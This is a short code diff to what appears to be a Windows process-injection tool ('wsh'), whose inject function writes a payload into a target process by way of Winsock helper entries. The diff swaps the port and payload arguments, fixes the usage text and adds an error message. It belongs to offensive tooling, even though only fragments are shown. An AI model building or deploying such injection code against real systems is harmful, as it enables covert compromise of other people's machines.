@@ -592,6 +592,8 @@ VOID inject(DWORD pid, WORD port, LPVOID payload, DWORD payloadSize) {
         
       VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
       closesocket(s);        
+    } else {
+      printf("Unable to find WINSOCK_HELPER_DLL_INFO entry.\n");
     }
     CloseHandle(hp);
 }
@@ -642,16 +644,16 @@ int wmain(int argc, WCHAR *argv[]) {
         ListWSHX(pid);
       } else {
       // if two parameters, attempt to perform injection
-        len = readpic(argv[2], &payload);
+        len = readpic(argv[3], &payload);
         if(len == 0) {
-          printf("Unable to read %ws.\n", argv[2]);
+          printf("Unable to read %ws.\n", argv[3]);
         } else {
-          port = wcstoull(argv[3], NULL, 10);
+          port = wcstoull(argv[2], NULL, 10);
           inject(pid, port, payload, len);
         }
       }
     } else {
-      printf("\nusage: wsh <process> <payload> <port>\n");
+      printf("\nusage: wsh <process> <port> <payload>\n");
     }
     return 0;
 }
